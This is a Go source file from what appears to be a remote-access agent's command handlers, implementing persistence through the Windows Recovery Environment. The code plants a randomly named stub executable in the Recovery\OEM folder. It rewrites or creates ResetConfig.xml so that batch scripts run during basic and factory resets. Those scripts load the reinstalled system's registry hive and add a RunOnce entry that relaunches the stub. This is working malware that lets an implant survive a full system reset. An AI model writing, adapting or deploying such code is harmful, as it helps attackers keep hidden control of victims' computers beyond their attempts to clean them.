//go:build windows && overlord_winre
// +build windows,overlord_winre

package handlers

import (
	"context"
	"encoding/xml"
	"fmt"
	"log"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"time"

	"overlord-client/cmd/agent/runtime"

	"golang.org/x/sys/windows"
)

const (
	winreOEMRelPath     = `Recovery\OEM`
	winreBackupDirName  = "XRSBackupData"
	winreResetConfigXML = "ResetConfig.xml"
	winreDeleteManifest = "DELETEME"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func randomAlphanumeric(n int) string {
	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

type resetConfig struct {
	XMLName xml.Name   `xml:"Reset"`
	Runs    []runEntry `xml:"Run"`
}

type runEntry struct {
	XMLName  xml.Name `xml:"Run"`
	Phase    string   `xml:"Phase,attr"`
	Path     string   `xml:"Path"`
	Duration int      `xml:"Duration"`
	Param    string   `xml:"Param,omitempty"`
}

func systemDrive() string {
	sd := os.Getenv("SystemDrive")
	if sd == "" {
		sd = "C:"
	}
	return sd
}

func oemPath() string {
	return filepath.Join(systemDrive()+`\`, winreOEMRelPath)
}

func backupPath() string {
	return filepath.Join(oemPath(), winreBackupDirName)
}

func resetConfigPath() string {
	return filepath.Join(oemPath(), winreResetConfigXML)
}

func createOEMEnvironment() error {
	oem := oemPath()
	if err := os.MkdirAll(oem, 0o755); err != nil {
		return fmt.Errorf("failed to create OEM directory: %w", err)
	}
	bk := backupPath()
	if err := os.MkdirAll(bk, 0o755); err != nil {
		return fmt.Errorf("failed to create backup directory: %w", err)
	}
	return nil
}

func createPayload(command string) string {
	rndKey := randomAlphanumeric(20)
	return fmt.Sprintf(`@echo off
for /F "tokens=1,2,3 delims= " %%%%A in ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\RecoveryEnvironment" /v TargetOS') DO SET TARGETOS=%%%%C

for /F "tokens=1 delims=\" %%%%A in ('Echo %%TARGETOS%%') DO SET TARGETOSDRIVE=%%%%A

reg load HKLM\%s %%TARGETOSDRIVE%%\windows\system32\config\SOFTWARE

reg add HKLM\%s\Microsoft\Windows\CurrentVersion\RunOnce /v %s /t REG_SZ /d "%s"

reg unload HKLM\%s
`, rndKey, rndKey, rndKey, command, rndKey)
}

func backupCurrentConfig(basicResetFileName, factoryResetFileName string, additionalFiles []string) error {
	bk := backupPath()
	lines := []string{basicResetFileName, factoryResetFileName}
	lines = append(lines, additionalFiles...)
	content := strings.Join(lines, "\n")
	if err := os.WriteFile(filepath.Join(bk, winreDeleteManifest), []byte(content), 0o644); err != nil {
		return err
	}

	rcPath := resetConfigPath()
	if _, err := os.Stat(rcPath); err == nil {
		data, err := os.ReadFile(rcPath)
		if err != nil {
			return err
		}
		if err := os.WriteFile(filepath.Join(bk, "configBackup"), data, 0o644); err != nil {
			return err
		}
	}
	return nil
}

func saveScriptFile(fileName, payload, additionalCommand string) error {
	contents := payload
	if additionalCommand != "" {
		contents += additionalCommand
	}
	return os.WriteFile(filepath.Join(oemPath(), fileName), []byte(contents), 0o644)
}

func createNewResetConfig(basicFileName, factoryFileName, payload string) error {
	cfg := resetConfig{
		Runs: []runEntry{
			{Phase: "BasicReset_AfterImageApply", Path: basicFileName, Duration: 1},
			{Phase: "FactoryReset_AfterImageApply", Path: factoryFileName, Duration: 1},
		},
	}
	data, err := xml.MarshalIndent(cfg, "", "  ")
	if err != nil {
		return err
	}
	xmlContent := xml.Header + string(data)
	if err := os.WriteFile(resetConfigPath(), []byte(xmlContent), 0o644); err != nil {
		return err
	}
	if err := saveScriptFile(basicFileName, payload, ""); err != nil {
		return err
	}
	return saveScriptFile(factoryFileName, payload, "")
}

func updateExistingResetConfig(basicFileName, factoryFileName, payload string) error {
	data, err := os.ReadFile(resetConfigPath())
	if err != nil {
		return err
	}

	var cfg resetConfig
	if err := xml.Unmarshal(data, &cfg); err != nil {
		return err
	}

	maxDuration := 1
	for _, r := range cfg.Runs {
		if r.Duration > maxDuration {
			maxDuration = r.Duration
		}
	}

	additionalBasic := updatePhase(&cfg, "BasicReset_AfterImageApply", basicFileName)
	additionalFactory := updatePhase(&cfg, "FactoryReset_AfterImageApply", factoryFileName)

	if additionalBasic == "" {
		addNewPhase(&cfg, "BasicReset_AfterImageApply", basicFileName, maxDuration)
	}
	if additionalFactory == "" {
		addNewPhase(&cfg, "FactoryReset_AfterImageApply", factoryFileName, maxDuration)
	}

	out, err := xml.MarshalIndent(cfg, "", "  ")
	if err != nil {
		return err
	}
	xmlContent := xml.Header + string(out)
	if err := os.WriteFile(resetConfigPath(), []byte(xmlContent), 0o644); err != nil {
		return err
	}

	if err := saveScriptFile(basicFileName, payload, additionalBasic); err != nil {
		return err
	}
	return saveScriptFile(factoryFileName, payload, additionalFactory)
}

func updatePhase(cfg *resetConfig, phaseName, newFileName string) string {
	for i, r := range cfg.Runs {
		if r.Phase == phaseName {
			oldPath := `%TARGETOSDRIVE%\Recovery\OEM\` + r.Path
			oldParam := r.Param
			cfg.Runs[i].Path = newFileName
			cfg.Runs[i].Param = ""
			additional := `"` + oldPath + `"`
			if oldParam != "" {
				additional += " " + oldParam
			}
			return additional
		}
	}
	return ""
}

func addNewPhase(cfg *resetConfig, phaseName, fileName string, duration int) {
	cfg.Runs = append(cfg.Runs, runEntry{
		Phase:    phaseName,
		Path:     fileName,
		Duration: duration,
	})
}

func installWinREPersistence(fileBytes []byte, ext string) error {
	_ = uninstallWinREPersistence()

	if err := createOEMEnvironment(); err != nil {
		return err
	}

	stubName := randomAlphanumeric(20) + ext
	stubPath := filepath.Join(oemPath(), stubName)
	if err := os.WriteFile(stubPath, fileBytes, 0o644); err != nil {
		return fmt.Errorf("failed to write stub file: %w", err)
	}

	command := `cmd.exe /c start %TARGETOSDRIVE%\Recovery\OEM\` + stubName
	payload := createPayload(command)

	basicFileName := randomAlphanumeric(20) + ".bat"
	factoryFileName := randomAlphanumeric(20) + ".bat"

	if err := backupCurrentConfig(basicFileName, factoryFileName, []string{stubName}); err != nil {
		log.Printf("winre: backup config warning: %v", err)
	}

	rcPath := resetConfigPath()
	if _, err := os.Stat(rcPath); os.IsNotExist(err) {
		return createNewResetConfig(basicFileName, factoryFileName, payload)
	}
	return updateExistingResetConfig(basicFileName, factoryFileName, payload)
}

func uninstallWinREPersistence() error {
	bk := backupPath()
	if _, err := os.Stat(bk); os.IsNotExist(err) {
		return fmt.Errorf("WinRE persistence not installed")
	}

	oem := oemPath()
	if err := os.RemoveAll(oem); err != nil {
		return fmt.Errorf("failed to remove OEM directory: %w", err)
	}
	return nil
}

func handleWinREInstall(ctx context.Context, env *runtime.Env, cmdID string, filePath string, useSelf bool) error {
	if !windows.GetCurrentProcessToken().IsElevated() {
		return fmt.Errorf("WinRE persistence requires admin privileges")
	}

	var fileBytes []byte
	var ext string

	if useSelf {
		exePath, err := os.Executable()
		if err != nil {
			return fmt.Errorf("failed to get executable path: %w", err)
		}
		fileBytes, err = os.ReadFile(exePath)
		if err != nil {
			return fmt.Errorf("failed to read self executable: %w", err)
		}
		ext = filepath.Ext(exePath)
		if ext == "" {
			ext = ".exe"
		}
	} else {
		if filePath == "" {
			return fmt.Errorf("missing filePath")
		}
		for i := 0; i < 30; i++ {
			if _, err := os.Stat(filePath); err == nil {
				break
			}
			time.Sleep(500 * time.Millisecond)
		}
		var err error
		fileBytes, err = os.ReadFile(filePath)
		if err != nil {
			return fmt.Errorf("failed to read file: %w", err)
		}
		ext = filepath.Ext(filePath)
		if ext == "" {
			ext = ".exe"
		}
	}

	return installWinREPersistence(fileBytes, ext)
}

func handleWinREUninstall(ctx context.Context, env *runtime.Env, cmdID string) error {
	if !windows.GetCurrentProcessToken().IsElevated() {
		return fmt.Errorf("WinRE uninstall requires admin privileges")
	}
	return uninstallWinREPersistence()
}

func WinRESupported() bool {
	return true
}
